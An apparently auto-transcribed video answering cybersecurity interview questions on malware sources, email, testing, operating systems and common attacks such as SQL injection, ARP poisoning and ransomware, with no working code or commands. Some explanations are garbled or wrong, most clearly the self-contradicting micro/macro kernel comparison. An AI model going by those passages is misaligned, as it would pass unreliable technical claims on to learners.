why would why would somebody want to
forget a usb it's most likely planted
over there as a social engineering
attack so that a gullible person is
going to pick it up
plug it into their device if the device
is not secured enough
it is going to install the malware
right
then documents and executable files this
is where your viruses and all those
creeps in so let's say you're surfing on
the internet you're looking for a
software
uh and you find the software on a
particular website you do not verify the
trustworthiness of that site
and you just download and install that
software now that software could be
malware as well thus if you're surfing
on the internet you're downloading files
from different locations you have to
research the website you have to
research the source to ensure that it is
trustworthy and only then are you going
to download and execute those files thus
internet downloads as well and when we
say internet downloads it's not just
untrustworthy sites we go to torrents uh
we go to uh
the dark web or the deep web and
searching for other softwares especially
those who are researching security right
we always want we are always on the
lookout of new softwares and we are
always on those forums which may not be
so much trustworthy
and we just download those files and
start installing them that is a very bad
scenario right so you have to be very
careful what you are downloading from
the internet your anti-viruses your uh
anti-fishing mechanisms your threat
intelligence mechanisms uh have those
mechanisms installed and you want to
verify where your downloads are coming
from then your network connections if it
is a p2p connection it is a local area
network connection or a metropolitan
area network you have to verify whom
which devices are connected to your
machines and you have to validate those
connections before you want to trust
those devices uh and before you connect
to them
if you're on a public wi-fi you probably
don't want to connect to a public wi-fi
in the first place
then comes email attachments
there are so many attachments that come
across in today's world most of them in
a zip format or a rar format
some of them come as document files
where there are macros hidden within
them macros are scripts that are
recognized by microsoft office files
right
and then finally there are these
malicious advertisements that we find
online right uh let it be facebook let
it be whatsapp let it be
any social media platform that you go or
even your
search engines
their job is to display ads their job is
not to verify whether the ad is legit or
not it is for us as consumers to be
careful and validate that ad and verify
whether it is a genuine ad or not so
just don't start clicking on
uh any of the ad trusting uh the
platform that you're on
be
sure that you are investigating that so
these are the most common
sources of malware and the end user
will always get infected by one of these
mechanisms moving on to question 14
how does email work
now this is a very uh
can be a complex question uh but we have
to keep it as simple as possible and we
have to identify that there are uh two
servers
while both of them either using smtp
which is the simple message transfer
protocol
where
in this scenario john
wants to send an email thus they've got
an email client installed on their
machine which is connected to the mail
exchange server which has a dns server
which maps the routing and which maps
the exchange server and inboxes
so when john composes that message and
clicks on send john should be connected
to a male exchange server where the
email is sent through that particular
person's inbox so so john's inbox will
then
uh be validated and that email will then
be sent through the dns server
through the internet and will be
received by the recipient mail server so
at this point in time john also requires
the recipient's
email address so in this case this is
jack so jack something.com would be the
email address
so while john is composing
the two field will have jack's email
address the from field will have john's
email address the subject field will
have whatever they want to convey as a
message the message body will have the
message itself and then when
john clicks on send it will go to
direction server the exchange server
will then validate the inbox and
identify where that inbox is located for
jack and then through the internet it
will be sent to the uh to the mail
server of jack the mail server will then
identify the proper
inbox that it now that that email needs
to be sent to and it will store that
email in that particular inbox
when jack opens their computer
and accesses their inbox this email from
john will be already waiting for them
and they can respond to it the same way
john had sent that email
if getting your learning started is half
the battle what if you could do that for
free visit skill up by simply learn
click on the link in the description to
know more
moving on to question 15 what are the
types of threats a company can face
right and this is where your threat
modeling comes into the picture so
you're looking at software as you're
looking at operating systems and the
company comes and asks you
uh what are the threats that are most
likely
that a company will face so on a broader
scale the threats that a company will
always face would be classified as
natural threats man-made threats
technical threats and a supply system
threat
so a natural threat would be an act of
god which is outside the control of
human beings could be
storms or any natural occurrences like
volcanoes
thunderstorms flooding
earthquakes fire
and so on so forth so anything that is
natural so it depends on the geographic
location that you're in
and what kind of climate that area faces
and you need to identify the immediate
threats
and prepare for them so if it is
flooding that you're looking at
and you want to look at an office
and the possibility of the office
getting flooded is real you probably
want to
take office at a higher floor
so that the threat of flooding is
minimized
for fire we always have a fire drill
where we practice our fire mechanism so
that we can evacuate all humans as soon
as possible and then worry about the
technicalities of it under any
circumstances under any threats humans
will always have the first priority
and then everything else comes in
manmade threats are where man themselves
are a problem so strikes lockouts
hackers
theft
uh war
writing
all of those are manmade threats
which
we ourselves cannot be in control of but
we need to plan for them and we need to
have a
business continuity plan or a disaster
equity plan for any of these threats
that have been identified
then come the technical threats
technical could be software bugs
operating system bugs application bugs
that
uh that come with the applications that
we have or a hardware failure where a
server crashes a hard disk crashes
maybe
the processor stops working the
motherboard stops working ram gets
corrupted
any of the technical aspects
a stopping uh stop functioning does
creating a break in the business can
come under technical right so
uh anything to do with computers
let's say
a server failing or a
patch that is not installed on a
particular software those would come
under technical threats and then the
supply system the supply system are your
environmental threats which depend
depend on your supply chain field
failures what is the supply chain for
office to function there are a lot of
dependencies that office goes through
right there are a lot of other vendors
that suppose
that support and provide critical
infrastructure non-critical
infrastructure for the office to
function for first and foremost
electricity
without electricity nothing is going to
be powered on and you are not going to
be able to function so if there is an
electricity service provider and if
there's an electric outage that's that
comes under supply system
so that's a supply chain failure where
the vendor that provides electricity to
you has failed in providing that
particular service and now you need a
business continuity or a disaster
recovery plan so you probably have an
inverter or you already have a power
generator plant that is going to
generate your own power and supply to
your system
right they could be short circuits
because of fluctuation in the
electricity uh maybe the internet
service provider fails and your internet
caches so you have a backup line for the
internet from a different vendor right
and so on so forth maybe your hardware
vendors who are supplying you servers
desktops laptops and whatnot they fail
because they feel they are facing a
strike or they go bankrupt and suddenly
you can no longer purchase hardware from
your vendor because they no longer are
in business so that's a supply chain
failure
so any of these systems failing would
also come under threats
so under a broad category these are the
first four threads that you need to
identify and then you can elaborate by
providing more scenarios based on the
experiences that you have had towards
each and every of these threats so
natural threat where you may have had
experience where there would have been
let's say flooding
uh or
any natural disaster which caused a
problem for the continuity of your
particular business so identify each and
every example for each of these threads
and provide that as an example in the
interview
what is black box and white box testing
so when you are testing a software or
you're testing your infrastructure there
are two different
tests that you can conduct the first one
is a black box the second one is a white
box in a black box test there is no
knowledge that is shared with the tester
so let's say you're an ethical hacker
and you have been awarded a contract by
an organization to test the current
application that they have developed now
they are not going to give you any
information they are not going to tell
you what the application is they just
probably give you an ip address and a
port number where the application is
hosted and now you have to file in your
own queries and try to figure out what
the application is try to gather
information see what uh what information
can be gathered in the first place and
based on that you're going to figure out
your way identify vulnerabilities and
see if any of those vulnerabilities can
lead to an security incident so without
any knowledge zero knowledge of the id
infrastructure or the source code that's
a black box attack or a black box test
a white box test on the other hand is
where full knowledge of the iit
infrastructure or the source code is
shared
so the ethical hacker has complete
knowledge
and based on the knowledge they are then
going to test out the system to see if
there are any flaws that they can
identify right so
why would these two audits be important
because the first one a black box audit
emulates the attack of a outsider or
external hacker sitting outside the
organization trying to figure their way
in whereas a white box attack can
emulate the attack of an insider so a
disgruntled employee within that
organization misusing their access
controls or the access rights
to make uh unvalidated profits right
so somebody's corrupt who has been
bribed who wants to sell out company
secrets based uh so they're going to try
to find out vulnerabilities try to steal
data and try to sell it on the uh gray
market right so a white box would
emulate a internal attack a black box
would emulate an external attack moving
on to question 17 what is use case
testing
now use case testing is a functional
test
and it is also a black box test
right what is a functional test it tests
the functionality of a particular
software once it has been created
why is it a black box test because the
user doesn't know what the functionality
is they just want to find out each and
every scenario and try to see what that
scenario
generates as a response they are not
sure whether that is the appropriate
response that should be generated or not
they're just trying to find out the
response that is going to be generated
after they fire off a query so this
technique is used by testers to get the
test scenarios to exercise the whole
system from start to finish
so let's say it's a login mechanism for
an application right now a user
at this point in time the tester since
it's a black box testing will know that
it is a login mechanism they will not
know the details of what logging
mechanisms are being utilized so they
wouldn't know whether uh input
validation is done they wouldn't know
whether output encoding is done they
wouldn't know how the cgi calls are
being made they will not know how the
queries are handled at the server side
and how the database is going to treat
that particular query so they have no
idea whether sql injection attacks are
possible and so on so forth so for them
with whatever input they are going to
try to insert
for that login mechanism that's a
functional black box test the
functionality being whether the login
mechanism works and based on the type of
inputs that are going to put in whether
it creates an unwarranted output whether
they can bypass the mechanism or they
can uh hack into the system because of
some of the flaws that were left behind
right another example here is a software
made for users to use for documentation
the testers will test all the cases that
the user can do so can the user view a
document can they add new documents can
they edit documents and can they delete
documents
so this functionality
will depend upon the access controls
that have been granted to a particular
user so for this particular user the
tester at this point in time they would
not know whether they're an
administrative user or they're a regular
user they'll just try to do all of these
and then write the responses saying i
was able to view i was able to add i was
able to edit and i was able to delete
now the result will be then sent to a
manager the manager will look at the
results and then based on the actual
access controls that were supposed to be
there for this particular user then
we'll try to identify whether this is an
acceptable case or whether there were
any flaws within this case
moving on to question 18
what is static and dynamic testing now
this is again in application testing
static testing is done in an early stage
of development life cycle now software
development life cycles there are
multiple of those what are these life
cycles
there are different stages in which a
application is
created
and provided to the customer
so your first stage would be determining
the scope of the application determining
the hardware requirements for that
application
then
creating a flowchart for that
application a functional chart for that
application and then maybe start coding
then an architect comes in tests the
code verifies the code then the testing
phase comes in then the security testing
phase comes in and then the user
acceptance testing comes in but
in every stage at the very earliest of
first stage a static test will always be
started
to see whatever code has been developed
whatever uh scope has been developed
whether that scope is going to be
correct or not this will include
walkthroughs and code review what is a
walkthrough a walkthrough is going
through documents that have been
generated and trying to find faults in
the documented journey that has been
talk that has been created so far so
let's say somebody has created a
workflow
or a flowchart for a program how the
functions are going to be called and how
they're going to be executed so a
walkthrough would be where uh all these
responsible people will walk through
that particular flowchart and find out
any flaws within that and then rectify
them
if there is any code that has already
been written this code will be reviewed
manually and
any flaws within that code would then be
identified static testing will always be
100 accurate in a very short amount of
time because it is immediate uh you have
created it and then the expert is going
to test it to see whether everything is
fine or not
right it is all about prevention
mechanism so since you are doing it at
the inception itself if you find any
flaw it gets immediately repaired so
this is about preventing vulnerabilities
from keeping into that application at a
later point in time
whereas dynamic on the other side is
done at the end of the development life
cycle so you have generated the
application everything is ready now you
want to do dynamic testing includes
functional and non-functional testing
functional testing is where the
application itself is being tested the
functions to see that all the parameters
that are given to the application are
functioning properly
non-functional testing would be where
security parameters
administrative parameters all of them
are being verified
right
this is where your test case scenarios
come in
and uh
you're going to test each and every
scenario
by generating inputs and analyzing the
output that the application is going to
give you
dynamic testing is all about cure so
here you're going to identify
vulnerabilities report them to the
management and the management is then
going to figure out a way of patching
those vulnerabilities so that they can
be mitigated moving on to the next
question what are the test levels in
software testing so
as far as software testing is concerned
there are four test levels module
testing integration testing system
testing and the final one is acceptance
testing so in the testing phase of your
development life cycle the first thing
is a module test you're going to check
your routines your subroutines your sub
programs procedures that have been
written in a program so all your
functions all your
mechanisms for that application are
going to be tested when you go into
integration testing the software may
have been integrated with multiple
softwares there may be different api
calls coming in maybe a third party
software on which you are
depending upon to supply for information
so all of these integration of various
software's various apis are tested to
ensure that they are functioning
properly and there are no flaws errors
or mistakes leave behind in the
integration of all of these softwares
then the system testing
is where the entire system so including
the hardware including the software
right it starts from the installation so
now the software is complete we know
which hardware we are going to support
for it we start by installing the
software and see whether the
installation is going to be completed
properly if there are any errors in the
installation process itself
then once it is installed the
performance of that particular
application
the
write speeds the read speeds on the hard
disk
uh the transaction speeds that the
application is capable of the network
dependencies that the application may
have all of those would come under
system testing and then the acceptance
testing which is basically a quality
assurance exercise
that
the application meets the client's
requirements so the client in the first
stage would have given the scope of what
needs to be achieved in the acceptance
testing you're verifying that that scope
has been met and the client requirements
have been met and you can assure the
client about the functionality and the
performance of that particular
application coming to the last question
in this
software programs
what are the valuable steps to resolve
issues while testing so in the previous
scenarios when we have started testing
now if you find out
when you execute a particular use case
and then you find out of law what would
be the steps that you would utilize to
address those particular flaws in those
tests the first step will always be
record then you're going to report it
and then you're going to introduce a
control process for it so when you say
record
you're going to create logs and you're
going to try to resolve all the problems
that have happened now when you say
resolve you're not going to recode the
application but you're going to test the
system again and again to ensure that
whatever is being recorded
is accurate
and all the logs all the error
mechanisms all the dumps all of those
that have been generated due to this
particular log of this particular error
are being captured so that they can be
reported to the higher level managers so
the next step is once you've
eventually accumulated all these logs
and records you're going to report them
to the higher level managers who are
then going to investigate it and go back
to the developers trying to figure out
the best way to mitigate those
particular flaws so the report writing
needs also also needs to be accurate uh
it needs to be to the point uh it needs
to detail what the problem was it will
document all the steps that they were
that you took
all the inputs that you put in and it
will also
record all the errors and it will also
record
all the mechanisms that were utilized
and the
errors that were generated
and that report will be given to the
higher level managers who can then
forward it to the developers who based
on those reports can start their
troubleshooting and then the control
mechanism comes in you're going to
define the issue management process
so this process needs to work in a
particular manner where you're doing a
test you're recording whatever is
happening you're creating a report out
of it you're sending it to the
management the management will then take
those reports study them take it to the
developers the developers will test
based on their criterias they might
interact with the testers at that point
in time to identify particular flaws
and then they might want to record that
application on a developer patch which
once installed
will mitigate that particular flaw and
then it can come back to the testing
phase again where you can repeat those
tests and validate that the flaw is no
longer existing
so these are the three steps
that would be utilized for testing
purposes
and that brings us to the first 10
questions on the software platform in
the next video we'll be looking at
operating systems and applications
the first question is on virtual memory
what exactly is virtual memory
for a computer we have two types of
memory the first is the primary memory
which is your random access memory which
is also known as a volatile memory and
the secondary memory is your hard disk
where your data is stored permanently
but for a computer when it has let's say
a 4gb memory or ram as in this scenario
on your screen it is going to replicate
that and is going to create another 4gb
of virtual memory on the hard disk and
it is going to use it in tandem along
with the ram
so if the ram is insufficient the
processor is going to utilize the 4gb of
the virtual memory that is created on
the hard disk and it is going to swap
data from the ram to the hard disk
this can also be known as a page file
or a swap file the next question is what
are different scheduling algorithms now
the context for this question is you're
talking about a profi processor and
you're talking about how processors are
going to be fed to the processor and how
the process is going to treat these
processes so the first is
first come first serve so the process
which requests the cpu first gets the
cpu allocation first now whenever there
are processes that are being run by
different applications they make
requests for some cpu type
now in first come first serve the first
service or the first process that is
going to request some processing time
will get that much allocated to them
they will run through the process first
and the next and the next and so on so
forth
the second one is the shortest job first
this is the process where the shortest
execution time for that process
is calculated and that process is
selected first for the cpu
then there is priority scheduling this
scheduler selects the task to work as
per priority so there would be some
tasks that are marked with high priority
some would be normal and some would be
low so based on this high
normal or low priority uh all the
processes will be classified higher
priority will be dealt with
first then the normal and the least
priority
the fourth option is multiple level
queues where processors are assigned to
a queue based on the specific property
like process priority the size of memory
etc so it will be classified based on
the
attributes given to that particular
process and
multiple cues will be created and then
based on the attributes the processes
will be
processed by the cpu
then shortest remaining time the process
will be allocated to the task which is
closest to its completion
so
or look at it this way the process that
will take the least time to complete its
processing would be chosen first
and then the round robin method where
each process comes in turn gets an equal
share of time so if there are 10
processors each process will be
allocated a certain amount of time after
which the next process will be processed
and so on so forth and it will continue
in a round robin fashion till all the
processes get executed
so in short
six
different scheduling algorithms
depending on how you uh how the
operating system deals with it
the next question is
what are the steps involved in hacking a
server or a network so this is more of
an ethical hacking question you're
looking at devices and for and the
interviewer asks you uh what kind of
steps are involved what are the
activities that you would do
in hacking a server or a network now
there are no specific steps that you
would define because every hack is going
to be unique but it has a hack can be
classified in five different steps
which are quite generic right so the
first step will always always be the
recognizance step
also known as
information gathering phase also known
as footprinting or fingerprinting uh
depending on what exactly you're doing
but in this phase
the attacker gathers all the evidence
all the information that is possible
about the targets that they want to
attack so here you're trying to get to
know the victim so you can launch
specific attacks towards them you want
to identify what operating system they
are utilizing what ip addresses mac
addresses the versions of the operating
systems and applications the patch
levels find out vulnerabilities find out
whatever information is possible find
out the information about the
person who is using those computers so
you can launch social engineering
attacks and so on so forth so the first
step is all about gathering enough
information
based on which you can launch further
attacks
once you have that information comes the
second phase which is known as the
scanning phase this is more of a
technical phase so yeah right in the
first step you've got your ip addresses
domain names maybe even network maps and
you have identified which devices are
available now in the scanning phase
you're going to identify live devices
and then you're going to scan them for
open ports processors protocols services
you're going to identify vulnerabilities
you're going to enumerate them to
identify more information from them
thus at this point in time you will have
identified a certain set of
vulnerabilities or a certain set of
security loopholes that you can misuse
once you have identified those
you are going to the next step which is
the gaining access tip
in this you're actually going to execute
your attacks based on the
vulnerabilities that you have found and
you're either going to gain access to
that particular system by installing a
trojan or destroy the system by
installing a virus or install a spyware
or a key logger whatever you wanted to
achieve so in the gaming access phase
you would have based on the knowledge
that you've gained in the first and the
second phase you're going to launch your
attacks and you're going to try to gain
access to that particular device
then the next step is where you're going
to maintain that access now that you
have hacked into that device it is not
necessary that you will always
be able to get access to that device uh
suppose you have cracked the password of
that particular user and the user
changes that password after a few days
your attack is worthless so what you're
going to do here is you're going to
maintain your access
so this is
where it is assumed that you want
repeated access to that device and thus
you're going to install a keylogger or a
trojan or some mechanism which will
still allow you to get access to that
device without the knowledge or the
authorization of that particular user
and finally the last step is where
you're going to cover your tracks so
whatever activity that we have done so
far will
have created logs and will have created
information
based on which the victim will come to
know that they have been compromised and
may be able to trace that activity back
to you so to prevent the user or the
victim from realizing that they have
been hacked and to prevent them to
discover who has hacked them
you want to cover your tracks by
deleting logs and any references that
point to that particular activity you
are going to hide the files that you
have created so you have installed a
trojan or a key logger
these will create files and directories
you're going to hide them so that they
are not discovered you're going to hide
processes that have been created you're
going to try to hide all the activity
that you have done so that to conceal
the actual attack
and preventing the user from realizing
that they haven't compromised
so these are the five steps that will be
involved in hacking a server network
application or any computing device
you'll come across the next question
refers to what are the various sniffing
tools now this is a network based attack
where you're trying to capture uh data
packages that that are being transmitted
over the network and then you're going
to analyze them to see if you can
capture any sensitive information like
usernames passwords bank details or any
anything of that sort now these tools
will also depend on which operating
system you're utilizing for example msn
sniffer would work on microsoft
operating systems
cab would be based on linux and so on so
forth so on the screen you'll see six
different sniffing tools that work on
different operating systems wireshark is
uh something that is common both on
windows and linux
it is used to analyze network in detail
it is the de facto tool that you will
come across in most of your ethical
hacking trainings in most
of your organizations when they want to
do
data captures
now data capturing or packet capturing
is not only done by hackers to gather
more information but it is also a known
troubleshooting technique used by
administrators and net network
administrators to analyze any issues
that may be going on in the network
right so while the first tool you see on
the screen is wireshark like we stated
is available for windows linux uh as
well
then there is tcp dump which again has
the same capability of wireshark but is
a command line version whereas wireshark
also has a gui a graphical user
interface
tcp dump is available on linux
msn sniffer it's a very old tool
when we had msn messengers
msn messenger is no longer there
but microsoft does or did have a
microsoft message analyzer tool uh which
they have stopped development since 2015
uh but that's another tool that is
specific for microsoft operating systems
from microsoft that can be installed
together more information then you've
got ethercap which is
a tool to launch man-in-the-middle
attacks data capturing and is is
essentially a linux command line based
tool
then dsniff is another password and
network capturing tool which can help
you capture data packets prominently a
linux
two
same with iterate
this is a graphical tool which will
allow you to
capture data data traffics and map
protocols and identify which ip
addresses have been communicating with
what essentially all of the tools have
similar functionality except that uh
some have additional functionality like
launching management attacks or
capturing or having specific filters
that will help you identify and
troubleshoot some network issues that
you may be facing moving on to the next
question what is an operating system now
this is a very difficult question to
answer because uh
we normally when we want to answer this
question we start off with the
functionality of an operating system
right
we try to describe what windows does or
what linux does or what mac os does and
then we are trying to figure out what an
operating system is in the first place
but an operating system essentially as
the slide says is a software program
that provides a platform for computer
hardware to communicate and operate with
the computer software so it is basically
an enabler for human interaction with
the hardware that you have if you take
the operating system out of the question
it's just some hardware which cannot
interact with you
but essentially when you have operating
system like microsoft windows or linux
or mac
you're essential essentially installing
an instruction set on that particular
device which will allow you to interact
and manipulate the hardware to do
whatever you want that hardware to do
right essentially when we talk about uh
drivers for your various devices like a
driver for your lan card or for your
sound card or your graphics card which
allows you to tweak these cards uh for a
functionality right
it allows us input and output functions
uh
for example the basic example you open
up microsoft office products like
microsoft word or excel and you get a
gui on the screen
which you can interact with you've got a
keyboard and you type on that keyboard
and the computer knows what you're
typing and reflects those
actions on the screen by showcasing it
on that particular
excel file or a word file so how does
the computer know what to do or what
you're exactly intending to do at this
point in time it is all the operating
system that is providing you all these
services analyzing what your inputs are
and then based
on the programming it is going to
execute that and show it to you on the
screen
right some of the most common commonly
used operating system are microsoft
windows you have them in desktop as well
as server variants
unix
linux again linux as desktop and
servers you've got ubuntu and linux red
hat and so on so forth and then you've
got mac os
for uh apple related components the next
question what is the difference between
micro kernel and macro kernel now the
first thing we need to know is what is a
kernel kernel is the
heart of the operating system that
allows that input and output to happen
it allows those drivers to be set up so
that the hardware can interact with the
software and we can then instruct the
software and the hardware both
to function in a particular manner
so there are two types of kernels micro
kernels and a macro kernel micro kernel
is something that we normally use micro
kernels are for
operating systems that use processes
directly handled by the processor
the microkernel is very small in size
micro kernel is large because it
basically is the entire image of the
operating system
the execution for a micro kernel is slow
the micro kernel is going to be faster
because it is more evolved
there's a lot of programming involved
extendability
micro kernels are easy to extend micro
um micro kernels are hard to extend as
far as security is concerned if a micro
kernel crashes it takes everything down
with it the entire operating system is
going to crash but in case of a micro
kernel it is only that particular
process that is going to get affected
micro kernel there is a lot of coding
involved
micro kernel less coding is involved
examples of micro kernels would be
simply an oss most popularly used on
yesteryear phones nokias if you remember
those
uh qnx and so on so forth micro kernels
your linux or psd operating systems
essentially use macro kernels
next question what are the different
types of operating systems
so as you can see on the screen
five types of operating systems batched
os distributed operating systems time
sharing multi-program and real-time what
are batched operating systems the
computer operator places the jobs coming
from input devices into batches
so
consider this not from a desktop
perspective but from a server
perspective where these devices are used
by organizations to compute and to
crunch some processes that is going to
make some business sense out of it so
when there are multiple processes coming
in multiple jobs that are going to be
scheduled a batched os is going to place
these jobs in batches and they're going
to crunch those based on the
inputs that have been given by these
operators distributed oss where there
are multiple computers which are
interconnected and are communicating
through networks so in a corporate
environment you don't use one single
computer to do everything you've got a
data center and the data center will
have a cluster of servers where they're
going to share some resources to crunch
one particular task right so that's
where your distributed oss come into the
picture
then you have time sharing oss where you
are renting some type so time sharing
voices minimizes the response time
example in today's world cloud right
you go on to the cloud you have a
virtual service over there
you schedule something you show you the
job over there it is
it is executed
and for that time being that operating
system services your particular request
and provides you that particular job
any application that you see online that
is executed for example facebook
from a consumer's perspective
could be a time shared experience
then multi-programmed os the operating
system uses cpu shuttling to separate
jobs so you're scheduling the cpu to
complete certain jobs
in this particular manner and in real
time os
the operating system uses maximum time
to critical operations so it identifies
uh the priority of these operations it
knows the high priority items the medium
low priority items and based on that it
is going to execute these critical
operations and get the job done
moving on to the next question what is
the difference between logical address
space and physical address space now
when you're looking at address spaces
this is where applications come into the
picture and when you execute an
application it is going to create a
particular address in the memory where
it is going to create a buffer to store
its own information so that it can be
provided to the processor processed and
then can be returned back to the
application as an output right so as far
as definitions are concerned a logical
address is generated during running of
an application
or a program a physical address is a
physical address or a physical location
on the memory module itself
right
visibility you can view a logical
address because it is programmed into a
computer so if i'm looking at cc
and i'm using malloc or memory
allocation
that's where the logical address is
going to be created where a buffer is
going to be created for that program and
whatever the user include is going to be
it's going to be stored in that buffer
but whereas physical addresses are
concerned this logical address will be
created on a physical store
or a physical memory module which will
have its own addressing mechanism thus
you you can see the memory module but
you cannot see the specific address on
that particular memory module but as far
as
a logical address is concerned while
you're programming or you're debugging
the application it will show you the
logical address that has been created
the start point and the end point of the
for that particular program and it can
be shown in a debugging environment
right
address space logical and physical
address is physical like here this case
it's the memory module itself you can
access only the physical address on that
particular memory because logical
addresses can be viewed but you cannot
access them physically uh generation uh
the logical addresses are generated by
the cpu uh during the processing time
whereas physical addresses are generated
are computed by the memory management
unit or the mmu that you have on your
computers
and as far as logical addresses they
will always be they are variable whereas
the physical address is always going to
be constant looking at the next question
what is the difference between logical
address space and physical active space
so moving on from the previous question
to this
the logical address is
a address created by the cpu for the
processors that need to be addressed and
that can be stored as a buffer in the
physical memory whereas the physical
memory itself is going to be a address
that is going to be there on the
physical part of that memory which is uh
which is going to be assigned to it by
the mmu then the next question discusses
uh shells so what shells are used in
linux now what is the shell shell is the
command line interface that we utilize
on a linux machine so the terminal
window as we call it
is a shell
and there are different variations of a
shell based on what linux operating
systems you're using the desktop
operating systems that you use
uh or the server operating systems and
real in today's world that you're going
to use normally will always have a bash
shell which is the first shell that you
see on the screen
known as a bone again shell it is a
default for linux distribution so as far
as end consumers
regular consumers are concerned it is
always going to be a bash shell a bone
again shell that you are going to
utilize for scripting and to execute
regular commands
but when it comes to high level
programming or it comes to
specialization tasks then you've got the
rest of these uh shells that you can
utilize for example the ksh known as a
con shell is used for high level
programming
which supports associative arrays and
built-in operations the csh or the c
shell
has different functionality like
spelling corrections and drop controls
the zsh or the z-shell
provides unique features like file
generation startup files
and fish friendly interactive shell
which provides features like auto
suggestions and configuration so all of
these have different functionalities
depending on what usage that you have
for that particular shell the most
common shell like i stated is the bash
shell that you'll always come across in
your desktop linux operating systems
then looking at the next question what
are the process states in linux now what
is a process process is basically a
service that is running
for a particular application for an
application to function right
this process is going to direct user
input to the processor process it
get that output back to the application
execute it and then show it onto the
graphical user interface for the user so
in linux there are five states for a
process first is the ready space now in
ready
in this state the process is created and
it is ready to run so it is waiting uh
it is waiting for input it's ready uh
the application is executed
the running is when the process is being
executed itself blocked or wait is when
user input is being looked upon so it's
waiting for user input so that it can do
the processing
completed or terminated it has completed
its execution or was terminated by the
operating system for some reason or the
other so this is where things have
uh the processing has been completed
and then lasted state is zombie where
the process is terminated but the
process table still holds the
information uh maybe it is waiting for
the kill request before it gets
terminated
so these are the five states for a linux
process to be in and that brings us to
the ten questions in the operating
system and application space in the next
video we'll be looking at ten more
questions on cyber attacks interview
questions based on cyber attacks
let's start off with the first one the
first question is what is sql injection
sql stands for
structured query language which is a
language that is used by most of your
databases or your relational databases
the variations of your database would be
mysql microsoft sql
oracle sql
you'll have ibm databases all of these
databases utilize the structured query
languages to interact with the
applications now all of these databases
have their own syntax so you'll have to
study most of these databases based on
which applications and which databases
you want to provide security for
but as the name suggests sql injection
vulnerability or structured query
language injection vulnerability
is where a user can maliciously inject a
sql input
or a sql statement in a query
and
send it to the database and evoke a
response response out of it
so this vulnerability is not
specifically to the database it uh the
vulnerability lies more in the
application and the coding of that
application
so when the application receives a query
which it needs to be forwarded to the
sql uh database
we need to configure at the application
level
of what queries are allowed and what
queries are not allowed so there are
different various aspects
of how to manage a sql injection
vulnerability but the basic flaw lies in
the application where uh invalidated
input is accepted and sent forward to
the database where the database might
confuse it into an executable statement
and thus create a
response that was not warranted
there are various types of sql
injections uh as shown on the screen in
band sql injection where you can look at
an error based or a union based
injection a blind sql injection where it
is either boolean based or a time-based
attack and then an out-of-bound sql
injection
essentially you're looking at databases
and you're looking at application
security where you want to encourage
secure coding practices so an
unvalidated input is mitigated
the next question is what is spoofing
now in spoofing you're basically
assuming the identity of another person
so here the attacker pretends to be some
other person or an organization and
sends you an email that appears to be a
legitimate email it looks almost genuine
it has been constructed to replicate
what a genuine email would have been
and it is very difficult to spot
a fake one
there are different ways to identify
whether an email is genuine or not
but that's for a different video moving
on to the next question what is a
distributed denial of service attack or
a ddos attack now generally a denial of
service attack is an attack where
legitimate users are prevented access to
the resources that they legitimately can
access right so for example if it is a
bandwidth-based attack
the attacker consumes the bandwidth of
the network in such a way that there is
no more bandwidth left for legitimate
users to access the network
now a single device may not be able to
generate that much amount of
traffic to consume the bandwidth of a
huge server thus the attacker will
construct a botnet
and through that botnet they will launch
a distributed denial of service attack
to the target victim right so a botnet
uh there are two uh terms that you want
to look at over here the first term is a
bot
and the second one being the botnet
itself bot is a software that once
installed on a victim's machine allows
the hacker to
send remote commands to that machine
that will
make it to generate some activity
once we have enough machines
on which such bots have been implemented
the collection of these machines would
be known as a botnet
so an attacker would then instruct this
entire botnet to start generating data
traffic to be to be sent to the targeted
network or to the targeted server which
will then bog down the server
thus crashing it and preventing users
from accessing that particular resource
the next question is how to avoid our
poisoning or arp now first let's
understand what arp is arp stands for
address resolution protocol which is a
protocol used by computers to
communicate over the network
once your computer boots up
it starts a discovery process of
identifying its neighbors so if i'm in a
particular subnet
my machine will proactively send out a
arb request an address resolution
protocol to find out which other
machines are within the same network
and which are live once it sends out a
query a live machine will respond to
that query along
with its mac address
this information is then
stored in what is known as a arp table
or an arp table on the machine's
cache so whenever my machine now wants
to send out a packet to this particular
machine it will go to the arp table it
will identify the ip address and the
associated mac address it will print
that onto the data packet as a
destination
and destination mac and send that packet
across to the switch the switch will
then identify the mac address and send
the packet to the relevant machine that
is connected to that particular switch
now to confuse the switch into sending
it to a different machine our poisoning
attack is created this attack is
generally
launched to
create a man in the middle attack
now to prevent this arc poisoning from
happening in the first place
there are three different aspects that
we can utilize first we can use packet
filtering
which will filter out and block packets
that are the same source address data so
you have identified some malicious ip
addresses and you want to block out some
ip addresses so you're using a packet
filter firewall where you have
constructed the firewall to filter out
certain packets
originating from particular range of ip
addresses this firewall and this
technique will then block those kind of
packets coming in
second keeping away from trust
relationships organizations will develop
protocols that do not depend on trust
relationships and thus you want to
keep this protocol away from that once
you have created a trust relationship
uh these machines should not be sending
out arp requests to other machines in
the first place since uh the trust
relationship has been defined and these
machines know whom to communicate with
such kind of protocols should then be
disabled
or you can use arp spoofing software so
there are some there are software's out
there that will look for arp spoofing
and prevent that from happening in the
first place so if somebody has sent out
a spoofed arp packet
that packet will be picked up by this
software
and it will be mitigated of
network visualizers like glasswire
antiviruses like so force
they have inbuilt capabilities of
identifying
our
spoofing attacks and mitigate them in
the first place in the next question we
are going to discuss what is ransomware
now ransomware is a type of malware that
blocks victims to access personal files
and demands ransom to regain access
there are three categories before we go
into the categories let's just revisit
what ransomware is let's start with the
word malware malware is a malicious
software that poses as a legitimate
software but has a payload that will
have a security impact on your machine
so in this instance uh viruses trojans
all of these can be classified under
malware so can ransomware a trojan is a
software that will give you a backdoor
access to it to a particular device a
virus will do some destructive activity
on that device a ransomware will
basically encrypt the data of that
particular user from on that particular
machine thus rendering that my that data
inaccessible to the users themselves
and in turn will demand the ransom to
provide access to that particular data
so the three types of ransomwares the
first one is scareware which uses social
engineering to cause an anxiety or the
perception of a threat to manipulate
users into buying unwanted software so
this preys on the gullibility of humans
where you can see a pop-up appearing on
your screen which can scare you into
believing that you may have been
attacked or there is a virus on your
machine and then instructs you to
download a particular software to
mitigate that particular virus now
the malware will be in this software
that you will be downloading and then a
ransomware will be installed and your
data will be encrypted
screen lockers uh where
locking uses computers by preventing
them from logging in and displaying an
official looking message you will see a
screen saver once you boot up which
prevents you from accessing the login
page so it will not allow you to log
into your own machine but it will give
you a warning that your data has been
encrypted and you need to connect to a
particular email address and send bit to
send bitcoins over there uh to get a
decryption key to access your own data
and then the encrypting ransomware
displays a message demanding payment in
return for the private asymmetric key
which is needed to decrypt the symmetric
